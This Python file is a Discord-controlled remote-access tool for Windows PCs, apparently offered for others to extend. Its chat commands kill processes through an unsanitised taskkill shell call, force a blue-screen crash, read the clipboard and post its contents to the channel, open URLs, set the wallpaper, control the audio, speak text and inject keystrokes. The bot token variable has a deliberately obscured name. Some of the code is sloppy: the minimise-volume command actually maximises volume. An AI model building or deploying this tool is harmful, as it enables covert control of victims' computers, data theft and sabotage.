import os
from discord import utils
from discord.ext import commands
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from bs4 import BeautifulSoup
import discord.ext.commands
import asyncio
from datetime import datetime, timedelta
import sys
import discord
from comtypes import CLSCTX_ALL
from discord.ext import commands
from ctypes import *
global isexe
isexe=False
if (sys.argv[0].endswith("exe")):
    isexe=True
global appdata
global temp 
idoawiodkjawdkjawkdjakdjsfuckdoa = "Discord Token HERE" #<- here


class MyClient(discord.Client):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.sniped_messages = {}  
    async def on_message_delete(self, message):
        self.sniped_messages[message.channel.id] = (message.content, message.author)
    async def on_ready(self):
        print('Logged on as', self.user)
    async def on_message_delete(self, message):
        self.sniped_messages[message.channel.id] = (message.content, message.author)
    async def on_message(self, message):
        if message.author == self.user:
            return
        if message.content.startswith('/prockill'):
            process_name = message.content[10:]
            os.system(f"taskkill /f /im {process_name}")
            await message.channel.send(f"{process_name} has been killed.")
        if message.content.startswith('/maxvolume'):
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            if volume.GetMute() == 1:
                volume.SetMute(0, None)
            volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
            await message.channel.send("🔊 - **Volume maxxed**")
        if message.content.startswith('/minvolume'):
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            if volume.GetMute() == 1:
                volume.SetMute(0, None)
            volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
            await message.channel.send("🔈 - **Volume minimized**")
        if message.content.startswith("/voice"):
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            if volume.GetMute() == 1:
                volume.SetMute(0, None)
            volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
            import win32com.client as wincl
            speak = wincl.Dispatch("SAPI.SpVoice")
            speak.Speak(message.content[7:])
            await message.channel.send("🗣️ - voice message sent!")
        if message.content == "/bluescreen":
            import ctypes
            import ctypes.wintypes
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
            await message.channel.send("🔷 - blue screen!")
        if message.content == "/cdir":
            import subprocess as sp
            output = sp.getoutput('cd')
            await message.channel.send("dir ->  " + output)
        if message.content.startswith("/website"):
            import subprocess
            website = message.content[9:]
            def OpenBrowser(URL):
                if not URL.startswith('http'):
                    URL = 'http://' + URL
                subprocess.call('start ' + URL, shell=True) 
            OpenBrowser(website)
            await message.channel.send("🔗 - opened link!")
        if message.content == "/grabclipboard":
            import ctypes
            CF_TEXT = 1
            kernel32 = ctypes.windll.kernel32
            kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
            kernel32.GlobalLock.restype = ctypes.c_void_p
            kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
            user32 = ctypes.windll.user32
            user32.GetClipboardData.restype = ctypes.c_void_p
            user32.OpenClipboard(0)
            if user32.IsClipboardFormatAvailable(CF_TEXT):
                data = user32.GetClipboardData(CF_TEXT)
                data_locked = kernel32.GlobalLock(data)
                text = ctypes.c_char_p(data_locked)
                value = text.value
                kernel32.GlobalUnlock(data_locked)
                body = value.decode()
                user32.CloseClipboard()
                await message.channel.send("📝 " + " ->  " + str(body))
        if message.content.startswith("/wallpaper"):
            import ctypes
            path = os.path.join(os.getenv('TEMP') + r"\temp.jpg")
            await message.attachments[0].save(path)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
            await message.channel.send("🖼️ - Wallpaper set!")
        if message.content.startswith("/cd"):
            os.chdir(message.content[4:])
        if message.content.startswith("/write"):
            import pyautogui
            if message.content[7:] == "enter":
                pyautogui.press("enter")
            else:
                pyautogui.typewrite(message.content[7:])
intents = discord.Intents.default()
intents.message_content = True
client = MyClient(intents=intents)
client.run(idoawiodkjawdkjawkdjakdjsfuckdoa)



# Add ur own commands I cba to do it lelzzzzz
